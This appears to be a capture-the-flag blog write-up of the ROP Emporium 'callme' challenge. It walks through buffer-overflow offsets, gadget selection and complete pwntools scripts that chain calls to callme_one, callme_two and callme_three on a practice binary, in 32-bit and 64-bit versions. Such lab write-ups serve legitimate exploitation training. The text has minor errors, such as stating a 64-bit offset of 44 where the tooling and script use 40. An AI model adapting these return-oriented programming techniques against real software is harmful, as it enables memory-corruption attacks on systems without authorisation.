---
layout: post
title: ROP Emporium - Callme
tags: [rop]
---

**Callme 32 Bit**
<br><br>
In this challenge, we need to execute callme_one(), callme_two() and callme_three() function sequentially in that order. Each function must contains arguments 1,2,3 e.g. callme_one(1,2,3) to get the flag. <br><br>

Let's find the EIP offset using Radare2.<br><br>

```bash
root@Perseverance:~/rop_emporium/callme32# r2 -de dbg.profile=profile.rr2 callme32 
Process with PID 4926 started...
= attach 4926 4926
bin.baddr 0x08048000
Using 0x8048000
asm.bits 32
glibc.fc_offset = 0x00148
[0xf7fa10b0]> dc
callme by ROP Emporium
32bits

Hope you read the instructions...
> child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x41415041 code=1 ret=0
[0x41415041]> wopO `dr eip`
44
```
<br>
EIP offset is 44.<br>
Let's find the callme_one, callme_two, and callme_three function address using `objdump`.<br><br>
```bash
root@Perseverance:~/rop_emporium/callme32# objdump -d callme32 | grep callme
callme32:     file format elf32-i386
080485b0 <callme_three@plt>:
080485c0 <callme_one@plt>:
08048620 <callme_two@plt>:
 804881b:       e8 90 fd ff ff          call   80485b0 <callme_three@plt>
 804882c:       e8 ef fd ff ff          call   8048620 <callme_two@plt>
 804883d:       e8 7e fd ff ff          call   80485c0 <callme_one@plt>
```
<br>
callme_one@plt address is 0x80485c0<br>
callme_two@plt address is 0x8048620<br>
callme_three@plt address is 0x80485b0<br><br>
Since we need to pass three arguments (1,2,3) into each function, let's find the required ROP chain using ROPgadget.<br><br>
```bash
root@Perseverance:~/rop_emporium/callme32# python ROPgadget.py --binary callme32 | grep pop
0x08048574 : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x080487ad : add byte ptr [ebx - 0x723603b3], cl ; popal ; cld ; ret
0x080488a5 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048576 : add esp, 8 ; pop ebx ; ret
0x080488bf : inc ebx ; pop ss ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x080488a4 : jecxz 0x8048831 ; les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x080488a3 : jne 0x8048891 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048577 : les ecx, ptr [eax] ; pop ebx ; ret
0x080488a6 : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x08048572 : mov edx, 0x83000000 ; les ecx, ptr [eax] ; pop ebx ; ret
0x080488a7 : or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
0x080488ab : pop ebp ; ret
0x080488a8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048579 : pop ebx ; ret
0x080488aa : pop edi ; pop ebp ; ret
0x080488a9 : pop esi ; pop edi ; pop ebp ; ret
0x080488c0 : pop ss ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x080487b3 : popal ; cld ; ret
```
<br>
The `0x080488a9 : pop esi ; pop edi ; pop ebp ; ret` ROP chain suitable for our requirement. 
After we gather all the necessary address, lets craft the exploit. The final payload will be: `"A" * 44 + <callone_function> + <rop_chain> + <arguments> + <calltwo_function> + <rop_chain> + <arguments> + <callthree_function> + <rop_chain> + <arguments>`
<br><br>
Below is a simple python script using pwntools to automate the process.<br><br>
```python
#!/usr/bin/python
from pwn import *

def main():
    junk = "A" * 44                     # EIP Offset at 44
    callone_addr = p32(0x80485c0)       # objdump -d callme32 | grep callme_one
    calltwo_addr = p32(0x8048620)       # objdump -d callme32 | grep callme_two
    callthree_addr = p32(0x80485b0)     # objdump -d callme32 | grep callme_one
    rop_chains = p32(0x080488a9)        # pop esi ; pop edi ; pop ebp ; ret
    args = p32(1) + p32(2) + p32(3)
    p = process("./callme32")
    payload = junk + callone_addr + rop_chains + args + calltwo_addr + rop_chains + args + callthree_addr + rop_chains + args

    p.sendlineafter(">", payload)
    print p.recvall()

if __name__ == "__main__":
    main()
```
<br>
Run the script and grab the flag.<br><br>
```bash
root@Perseverance:~/rop_emporium/callme32# ./callme32.py 
[+] Starting local process './callme32': pid 2618
[+] Receiving all data: Done (33B)
[*] Stopped process './callme32' (pid 2618)
 ROPE{a_placeholder_32byte_flag!}
```
<br><br>
**Callme 64 Bit**
<br><br>
Let's find the RIP offset using Radare2.
<br><br>
```bash
root@Perseverance:~/rop_emporium/callme# r2 -de dbg.profile=profile.rr2 callme
Process with PID 5287 started...
= attach 5287 5287
bin.baddr 0x00400000
Using 0x400000
asm.bits 64
[0x7f3ce371b090]> dc
callme by ROP Emporium
64bits

Hope you read the instructions...
> child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
[0x00401a56]> pxq 8@rsp
0x7ffecc0024c8  0x41415041414f4141                       AAOAAPAA
[0x00401a56]> wopO 0x41415041414f4141
40
```
<br>
RIP offset is 44.<br>
Let's find the callme_one, callme_two, and callme_three function address using `objdump`.
<br><br>
```bash
root@Perseverance:~/rop_emporium/callme# objdump -d callme | grep callme
callme:     file format elf64-x86-64
0000000000401810 <callme_three@plt>:
  401810:       ff 25 12 08 20 00       jmpq   *0x200812(%rip)        # 602028 <callme_three>
0000000000401850 <callme_one@plt>:
  401850:       ff 25 f2 07 20 00       jmpq   *0x2007f2(%rip)        # 602048 <callme_one>
0000000000401870 <callme_two@plt>:
  401870:       ff 25 e2 07 20 00       jmpq   *0x2007e2(%rip)        # 602058 <callme_two>
  401a6a:       e8 a1 fd ff ff          callq  401810 <callme_three@plt>
  401a7e:       e8 ed fd ff ff          callq  401870 <callme_two@plt>
  401a92:       e8 b9 fd ff ff          callq  401850 <callme_one@plt>
```
<br>
callme_one@plt address is 0x401850<br>
callme_two@plt address is 0x401870<br>
callme_three@plt address is 0x401810<br><br>

In 64 bit, the arguments need to passed into registers with order RDI, RSI, RDX, RCX, R8, and R9. We need to pass three arguments into each function, let's find the ROP chain that pops RDI, RSI, and RDX using ROPgadget.
<br><br>
```bash
root@Perseverance:~/rop_emporium/callme# python /root/Documents/pwning/ROPgadget/ROPgadget.py --binary callme | grep "pop rdi"
0x0000000000401aae : add byte ptr [rax], al ; pop rdi ; pop rsi ; pop rdx ; ret
0x0000000000401aad : add byte ptr [rax], r8b ; pop rdi ; pop rsi ; pop rdx ; ret
0x0000000000401aab : nop dword ptr [rax + rax] ; pop rdi ; pop rsi ; pop rdx ; ret
0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret
0x0000000000401b23 : pop rdi ; ret
```
<br>
The `0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret` ROP chain suitable for our requirement. 
After we gather all the necessary address, we can craft the exploit. In 64 bit, we need to set up the registers, 
in this case, the RDI, RSI and RDX with the correct value before calling the functions. This makes the payload structure a little bit different compared to the 32 bit.<br>
`"A" * 40 + <rop_chain> + <arguments> + <callone_function> + <rop_chain> + <arguments> + <calltwo_function> + <rop_chain> + <arguments> + <callthree_function>` 
<br><br>
Below is a simple python script using pwntools to automate the process.<br><br>
```python
#!/usr/bin/python
from pwn import *

def main():
    junk = "A" * 40                     # RIP Offset at 40
    callone_addr = p64(0x401850)        # objdump -d callme | grep callme_one
    calltwo_addr = p64(0x401870)        # objdump -d callme | grep callme_two
    callthree_addr = p64(0x401810)      # objdump -d callme | grep callme_three
    rop_chains   = p64(0x401ab0)        # pop_rdi ; pop rsi ; pop rdx ; ret
    args  = p64(1) + p64(2) + p64(3)
    p = process("./callme")
    payload = junk + rop_chains + args + callone_addr + rop_chains + args + calltwo_addr + rop_chains + args + callthree_addr

    p.sendlineafter(">", payload)
    print p.recvall()

if __name__ == "__main__":
    main()
```
<br>
Run the script and grab the flag.<br><br>
```bash
root@Perseverance:~/Documents/pwning/rop_emporium/callme# ./callme.py 
[+] Starting local process './callme': pid 2710
[+] Receiving all data: Done (33B)
[*] Process './callme' stopped with exit code 0 (pid 2710)
 ROPE{a_placeholder_32byte_flag!}
```
<br><br>
